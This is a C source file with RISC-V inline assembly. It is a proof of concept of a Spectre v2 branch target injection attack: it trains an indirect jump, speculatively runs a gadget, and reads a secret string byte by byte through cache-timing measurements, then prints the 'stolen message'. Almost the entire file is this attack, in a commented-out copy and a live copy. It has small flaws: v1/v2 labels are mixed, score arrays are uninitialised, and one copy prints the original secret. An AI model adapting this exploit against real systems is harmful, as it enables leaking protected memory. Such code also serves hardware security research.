
// #include <stdio.h>
// #include <stdint.h>
// #include "datatype.h"

// #define Cache_Line 64
// #define HIT_THRESHHOLD 85
// #define TRAIN_TIMES 6 
// #define ROUNDS 1 
// #define ATTACK_SAME_ROUNDS 3 
// #define SECRET_SZ 40
// #define CACHE_HIT_THRESHOLD 85

// /* -------------------------------------------------------------------------- */
// /*                               global varibles                              */
// /* -------------------------------------------------------------------------- */
// uint64_t array1_sz = 16;
// uint8_t unused1[64];
// uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
// uint8_t unused2[64];
// uint8_t array2[256 * Cache_Line];
// uint8_t *p_array2 = array2;
// // uint8_t p_array2;
// char *secret = "The Magic Words are Squeamish Ossifrage.";
// // measure cache load time
// uint64_t start = 0, end = 0;
// int diff[256] = {0};
// int diff_time = 0;
// // temp for read atk_array
// static unsigned char temp = 1;

// void wantFunc(uint64_t idx)
// {
//     asm volatile("nop");
// }
// void victimFunc(uint64_t idx)
// {
//     temp = array2[array1[idx] * Cache_Line];
// }

// /* -------------------------------------------------------------------------- */
// /*                                    main                                    */
// /* -------------------------------------------------------------------------- */
// int main(void)
// {
    
//     /* ----------------------------- local varibles ----------------------------- */
//     uint64_t wantAddr = (uint64_t)(&wantFunc);
//     uint64_t victimAddr = (uint64_t)(&victimFunc);
//     uint64_t passInAddr;
//     uint64_t attackIdx = (uint64_t)(secret - (char *)array1);
//     uint64_t passInIdx, randIdx;
//     char secret_atk[SECRET_SZ];
//     unsigned int score[256];
//     unsigned int max_score = 0;
//     unsigned int second_probability = 0;
//     unsigned char max_score_char = 0;
//     unsigned char second_probability_char = 0;
//     uint8_t dummy = 0;
    
//     /* ------------------------- spectre v1 attack start ------------------------ */
//     printf("================= This is a POC of spectre_v2 (Branch Target Injection) ========================= \n");
//     printf("the secret key is:%s \n", secret);
//     // try to read out the secret
//     for (uint64_t len = 0; len < SECRET_SZ; ++len)
//     {
//         // run the attack on the same idx ATTACK_SAME_ROUNDS times
//         for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
//         {
//             // clear and invalid L1-dcache
//             asm volatile("Dcache.ciall");

//             for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS - 1); j >= 0; --j)
//             {
//                 passInAddr = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;             // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
//                 passInAddr = (passInAddr | (passInAddr >> 16));                   // set the passInAddr=-1 or 0
//                 passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr

//                 randIdx = atkRound % array1_sz;
//                 passInIdx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;       // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
//                 passInIdx = (passInIdx | (passInIdx >> 16));               // set the passInIdx=-1 or 0
//                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

//                 for (uint64_t k = 0; k < 100; ++k)
//                 {
//                     asm("");
//                 }

//                 // this calls the function using jalr and delays the addr passed in through fdiv
//                 asm volatile("addi %[addr], %[addr], -2\n"
//                              "addi t1, zero, 2\n"
//                              "slli t2, t1, 0x4\n"
//                              "fcvt.s.lu fa4, t1\n"
//                              "fcvt.s.lu fa5, t2\n"
//                              "fdiv.s	fa5, fa5, fa4\n"
//                              "fdiv.s	fa5, fa5, fa4\n"
//                              "fdiv.s	fa5, fa5, fa4\n"
//                              "fdiv.s	fa5, fa5, fa4\n"
//                              "fcvt.lu.s	t2, fa5, rtz\n"
//                              "add %[addr], %[addr], t2\n"
//                              "mv a0, %[arg]\n"
//                              "jalr ra, %[addr], 0\n"
//                              :
//                              : [addr] "r"(passInAddr), [arg] "r"(passInIdx)
//                              : "t1", "t2", "fa4", "fa5");
//             }
//             // cache measure and get secret info
//             for (int i = 0; i < 256; i = i + 1)
//             {
//                 p_array2 = array2 + i * Cache_Line;
//                 asm volatile(
//                     "fence rw, rw\n" // Memory barrier
//                     "rdtime %0"      // Read timestamp into output operand
//                     : "=r"(start));
//                 asm volatile("fence rw, rw");
//                 asm volatile(
//                     "lw %0, %1(%2)"
//                     : "=r"(dummy)
//                     : "i"(0), "r"(p_array2));
//                 asm volatile(
//                     "fence rw, rw\n" // Memory barrier
//                     "rdtime %0"      // Read timestamp into output operand
//                     : "=r"(end));
//                 diff[i] = (end - start);
//                 //printf("iteration=%d,read atk_array[%d],value %d, time = %d\n", i, ((p_array2-array2)/64),dummy, diff[i]);
//             }
//             for (int i = 0; i < 256; i++)
//                 if (diff[i] < HIT_THRESHHOLD)
//                     score[i]++;
//         }
        
//         // calculate max score and get results
//         for (int i = 5; i < 256; i++)
//             if (score[i] > max_score)
//             {
//                 max_score = score[i];
//                 max_score_char = i;
//                 diff_time = diff[i];
//             }
//         secret_atk[len] = max_score_char;
//         // show byte atk results
//         printf("Reading No.%d byte\n", len);
//         printf("cache read time is %d,value is '%d',word is '%c'; score = %d\n", diff_time, max_score_char, max_score_char, max_score);
//         // clear score
//         for (int i = 0; i < 256; i++)
//             score[i] = 0;
//         max_score = 0;
//         // read in the next secret
//         ++attackIdx;
//     }
//     // show atk results
//     printf("The stolen message is '%s'\n", secret);
//     printf("********************* spectre v2 end *********************\n\n");
//     return 0;
// }





#include <stdio.h>
#include <stdint.h>

#define Cache_Line 64
#define HIT_THRESHHOLD 85
#define TRAIN_TIMES 6 
#define ROUNDS 1 
#define ATTACK_SAME_ROUNDS 3 
#define SECRET_SZ 19
#define CACHE_HIT_THRESHOLD 85

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * Cache_Line];
uint8_t *p_array2 = array2;
// uint8_t p_array2;
char *secretString = "This is the secret!";
// measure cache load time
uint64_t start = 0, end = 0;
int diff[256] = {0};
int diff_time = 0;
// temp for read atk_array
static unsigned char temp = 1;

void wantFunc(uint64_t idx)
{
    asm volatile("nop");
}
void victimFunc(uint64_t idx)
{
    temp = array2[array1[idx] * Cache_Line];
}

int main(void)
{
    uint64_t wantAddr = (uint64_t)(&wantFunc);
    uint64_t victimAddr = (uint64_t)(&victimFunc);
    uint64_t passInAddr;
    uint64_t attackIdx = (uint64_t)(secretString - (char *)array1);
    uint64_t passInIdx, randIdx;
    char secret[SECRET_SZ];
    unsigned int probability_count[256];
    unsigned int first_probability = 0;
    unsigned int second_probability = 0;
    unsigned char first_probability_char = 0;
    unsigned char second_probability_char = 0;
    uint8_t dummy = 0;
    //******************** spectre v1 attack start ********************
    printf("================= This is a POC of spectre_v2 (Branch Target Injection) ========================= \n");
    printf("the secret key is:%s \n", secretString);
    // try to read out the secret
    for (uint64_t len = 0; len < SECRET_SZ; ++len)
    {
        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
        {
            // clear and invalid L1-dcache
            asm volatile("Dcache.ciall");

            for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS - 1); j >= 0; --j)
            {
                passInAddr = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;             // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
                passInAddr = (passInAddr | (passInAddr >> 16));                   // set the passInAddr=-1 or 0
                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr

                randIdx = atkRound % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;       // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16));               // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

                for (uint64_t k = 0; k < 100; ++k)
                {
                    asm("");
                }

                // this calls the function using jalr and delays the addr passed in through fdiv
                asm volatile("addi %[addr], %[addr], -2\n"
                             "addi t1, zero, 2\n"
                             "slli t2, t1, 0x4\n"
                             "fcvt.s.lu fa4, t1\n"
                             "fcvt.s.lu fa5, t2\n"
                             "fdiv.s	fa5, fa5, fa4\n"
                             "fdiv.s	fa5, fa5, fa4\n"
                             "fdiv.s	fa5, fa5, fa4\n"
                             "fdiv.s	fa5, fa5, fa4\n"
                             "fcvt.lu.s	t2, fa5, rtz\n"
                             "add %[addr], %[addr], t2\n"
                             "mv a0, %[arg]\n"
                             "jalr ra, %[addr], 0\n"
                             :
                             : [addr] "r"(passInAddr), [arg] "r"(passInIdx)
                             : "t1", "t2", "fa4", "fa5");
            }

            for (int i = 0; i < 256; i = i + 1)
            {
                p_array2 = array2 + i * Cache_Line;
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(start));
                asm volatile("fence rw, rw");
                asm volatile(
                    "lw %0, %1(%2)"
                    : "=r"(dummy)
                    : "i"(0), "r"(p_array2));
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(end));
                diff[i] = (end - start);
                //  printf("iteration=%d,read atk_array[%d],value %d, time = %d\n", i, ((p_array2-array2)/64),dummy, diff[i]);
            }
            for (int i = 0; i < 256; i++)
                if (diff[i] < HIT_THRESHHOLD)
                    probability_count[i]++;
            //}
        }
        //
        // get highest and second highest result hit values
        for (int i = 5; i < 256; i++)
            if (probability_count[i] > first_probability)
            {
                first_probability = probability_count[i];
                first_probability_char = i;
                diff_time = diff[i];
            }
        secret[len] = first_probability_char;
        printf("No.%d: read at attacker_addr is %p,time is %d,data is '%d',word is '%c'\n", len, attackIdx, diff_time, first_probability_char, first_probability_char);
        for (int i = 0; i < 256; i++)
            probability_count[i] = 0;

        first_probability = 0;
        // read in the next secret
        ++attackIdx;
    }
    printf("The stolen message is '%s'\n", secret);
    printf("********************* spectre v2 end *********************\n\n");
    return 0;
}